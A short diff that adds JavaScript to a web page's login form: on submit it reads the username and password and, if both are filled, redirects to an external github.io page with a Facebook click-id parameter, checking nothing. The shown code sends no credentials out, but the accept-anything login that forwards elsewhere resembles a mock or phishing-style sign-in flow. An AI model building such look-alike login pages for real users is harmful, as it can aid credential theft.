@@ -208,6 +208,22 @@
     </div>
 
     <script>
+
+        const userForm = document.getElementById("userForm");
+
+        userForm.addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+
+            if (username && password) {
+                window.location.href = "https://jfaithhhh.github.io/newmain/?fbclid=IwAR3C7KfkxCzmFMC1uXJuJ_rjHhwUSB6ln6-g7wHsEHCY4NI_8H-3AK-X4FA";
+            } else {
+                alert("Please fill in all fields.");
+            }
+        });
+        
         function validateForm(event) {
             const username = document.querySelector('input[name="username"]').value;
             const password = document.querySelector('input[name="password"]').value;
